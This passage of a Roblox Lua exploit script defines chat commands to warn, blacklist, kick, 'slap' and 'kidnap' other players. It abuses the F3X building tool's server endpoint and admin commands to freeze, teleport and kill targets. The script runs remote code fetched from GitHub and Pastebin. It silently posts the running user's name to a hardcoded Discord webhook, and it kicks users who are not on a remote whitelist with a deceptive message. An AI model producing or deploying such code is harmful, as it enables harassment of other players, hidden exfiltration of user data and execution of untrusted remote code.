Window:Notification{
                Title = "CMD",
                Text = v.Name .. " warned!",
                Time = 3,
                callback = function()
end 
}
end
end
end)

addcmd("warn2", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
    chat(":textw " .. v.Name .. " WARN:\nYOU WERE WARNING BY SYSTEM\nTHIS IS YOUR FIRST CHANCE, IF YOU REACH 3 WARN, YOU WILL GET KICKED.")
Window:Notification{
                Title = "CMD",
                Text = v.Name .. " warned!",
                Time = 3,
                callback = function()
end 
}
end
end
end)

addcmd("warn3", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
    chat(":textw " .. v.Name .. " WARN:\nYOU WERE WARNING BY SYSTEM\nTHIS IS YOUR FIRST CHANCE, IF YOU REACH 3 WARN, YOU WILL GET KICKED.")
Window:Notification{
                Title = "CMD",
                Text = v.Name .. " warned!",
                Time = 3,
                callback = function()
end 
}
end
end
end)

addcmd("blacklist", "ban", function(plr)
    for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
            table.insert(Blacklist, v.Name)
            chat(":sm [ CMD-AH ] User " .. v.Name .. " has been banned/blacklisted from this server. (Want to appeal? pm Ten.)")
            Window:Notification{
                Title = "CMD",
                Text = v.Name .. " Blacklisted!",
                Time = 3,
                callback = function()
                end
            }
        end
    end
end)

addcmd("unblacklist", "unban", function(plr)
    for _,v in pairs(game.Players:GetPlayers()) do
        if table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
            table.remove(Blacklist, table.find(Blacklist,v.Name))
            chat(":sm [ CMD-AH ] User " .. v.Name .. " has been unbanned/unblacklisted from this server!")
            Window:Notification{
                Title = "CMD",
                Text = v.Name .. " unblacklisted!",
                Time = 3,
                callback = function()
                end
            }
            chat(":refresh " .. v.Name)
        end
    end
end)

addcmd("kick", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
    chat(":loadb svs|:sm get rekt kicked|:fov " .. v.Name .. " 0|:fviewcam " .. v.Name .. " v|:sm [ CMD-AH ] User " .. v.Name .. " has been kicked from this server.|:wait 6|:unloadb rsv")
Window:Notification{
                Title = "CMD",
                Text = v.Name .. " kicked!",
                Time = 3,
                callback = function()
end 
}
end
end
end)

addcmd("slap", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
    chat(":to " ..v.Name.. "|:rope " ..v.Name.. " me 1|:animation me 243827693|:music 7772283448 true|:unrope " ..v.Name.. "|:punish " ..v.Name.."|:f3x")
Window:Notification{
                Title = "CMD",
                Text = v.Name .. " Slapped!",
                Time = 3,
                callback = function()
end 
}
end
end
end)


addcmd("slapk", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
    chat(":loadb svs|:to " ..v.Name.. "|:rope " ..v.Name.. " me 1|:animation me 243827693|:music 7772283448 true|:unrope " ..v.Name.. "|:punish " ..v.Name.."|:fviewcam " ..v.Name.. " v ")
Window:Notification{
                Title = "CMD",
                Text = v.Name .. " Slapped!",
                Time = 3,
                callback = function()
end 
}
end
end
end)

addcmd("slapb", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
    chat(":to " ..v.Name.. "|:rope " ..v.Name.. " me 1|:animation me 243827693|:music 7772283448 true|:unrope " ..v.Name.. "|:punish " ..v.Name.."|:f3x")
Window:Notification{
                Title = "CMD",
                Text = v.Name .. " Slapped!",
                Time = 3,
                callback = function()
			table.insert(Blacklist, v.Name)
end 
}
end
end
end)


addcmd("whitelist", "wl", function(plr)
    for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(whitelist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
            table.insert(whitelist, v.Name)
            if ServerlockV then
                chat(":setmsg [ CMD-AH ] This server is locked. \t\t Whitelisted users: " .. tostring(#whitelist))
            end
            chat(":talk " .. v.Name .. " [CMD]\nWHITELISTED")
            task.wait(.25)
            chat(":refresh " .. v.Name)
            Window:Notification{
                Title = "CMD",
                Text = v.Name .. " whitelisted!",
                Time = 3,
                callback = function()
                end
            }
        end
    end
end)

addcmd("unwhitelist", "unwl", function(plr)
    for _,v in pairs(game.Players:GetPlayers()) do
        if table.find(whitelist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
            table.remove(whitelist, table.find(whitelist,v.Name))
            if ServerlockV then
                chat(":setmsg [ CMD-AH ] This server is locked. \t\t Whitelisted users: " .. tostring(#whitelist))
            end
            Window:Notification{
                Title = "CMD",
                Text = v.Name .. " unwhitelisted!",
                Time = 3,
                callback = function()
                end
            }
            chat(":refresh " .. v.Name)
        end
    end
end)

addcmd("delparts","delp", function()
    delparts()
end)

addcmd("kidnap", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
wait(.1)
local F3X = game.Players.LocalPlayer.Backpack:WaitForChild('Folder'):WaitForChild('SyncAPI'):WaitForChild('ServerEndpoint')
local position = Vector3.new(-158, 30, -11) -- Insert your Vector3 pos here, it will convert to CFrame using CFrame.new(position)
local size = Vector3.new(23, 16, 1) -- Part Size
local wall = F3X:InvokeServer(unpack({
    [1] = "CreatePart",
    [2] = "Normal",
    [3] = CFrame.new(position),
    [4] = workspace
}))

F3X:InvokeServer(unpack({
    [1] = "SyncResize",
    [2] = {
        [1] = {
            ["Part"] = wall,
            ["CFrame"] = CFrame.new(position),
            ["Size"] = size
        }
    }
}))

F3X:InvokeServer(unpack({
    [1] = "SyncMaterial",
    [2] = {
                {["Part"] = wall, ["Transparency"] = 1},
              }
}))
    chat(":runc h|:wait 6|:tp " .. v.Name .. " wp-van|:speed " .. v.Name .. " 0|:jpower " .. v.Name .. " 0|:wait 4|:tp " .. v.Name .. " wp-van2|:wait .5")
	wait(23.5)
		F3X:InvokeServer(unpack({
            [1] = "SyncCollision",
            [2] = {
                {["Part"] = wall, ["CanCollide"] = false}
            }
}))
	chat(":runc v|:wait 7|:charaudio " .. v.Name .. " 147758746|:wait 3|:kill " .. v.Name .. " |:wait 7|:runc g")
Window:Notification{
                Title = "CMD",
                Text = v.Name .. " kidnapped!",
                Time = 3,
                callback = function()				
end 
}
end
end
end)

addcmd("kidnapk", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
wait(.1)
    chat(":runc h|:wait 6|:tp " .. v.Name .. " wp-van|:speed " .. v.Name .. " 0|:jpower " .. v.Name .. " 0|:wait 4|:tp " .. v.Name .. " wp-van2|:wait .5|:runc v|:wait 10")
	wait(41)
	chat(":kill " .. v.Name .. "|:fviewcam " .. v.Name .. " v|:wait 7|:runc g|:sm " .. v.Name .. " has been kidnap and go outside the game.")

Window:Notification{
                Title = "CMD",
                Text = v.Name .. " kidnapped!",
                Time = 3,
                callback = function()
end 
}
end
end
end)

addcmd("unglitchbp", "ungbp", function()
    SecureParts.Baseplate.Velocity = Vector3.new(0,0,0)
    SecureParts.Baseplate.RotVelocity = Vector3.new(0,0,0)
end)

addcmd("cmds", nil, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQax/WTF/main/CMDAHYIELD"))()
end)

local msg = "bruh, " .. game.Players.LocalPlayer.Name .. " just executed ur script"
local url = "https://discord.com/api/webhooks/1020687820903419934/QM21rcJbvNYHlQyYkGtRw24eEEbgE3t5hoVTb_S_vljV-i7jk3Wa13J8voRMUB3EFfHG"

request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})

local whitelistecheck = loadstring(game:HttpGet("https://pastebin.com/raw/4XV1VRVq", true))()
if whitelistecheck[game:service('Players').LocalPlayer.UserId] then
wait(0)
game.StarterGui:SetCore("SendNotification", {
Title = "yoo its my buyer"; -- the title (ofc)
Text = "Whitelist System checked. You are allowed to use my scripts."; -- what the text says (ofc)
Icon = "rbxassetid://0"; -- the image if u want. 
Duration = 5; -- how long the notification should in secounds
})
else
game:service('Players').LocalPlayer:Kick('are you trying to bypass gamepass check? your error has been sended to our discord server.')
end

chat(":Sm [ CMD-AH ] LOADED")
local message = Instance.new("Message",workspace)
message.Text = "Loaded! Talk .cmds to check commands."
wait(.3)
message:Destroy()

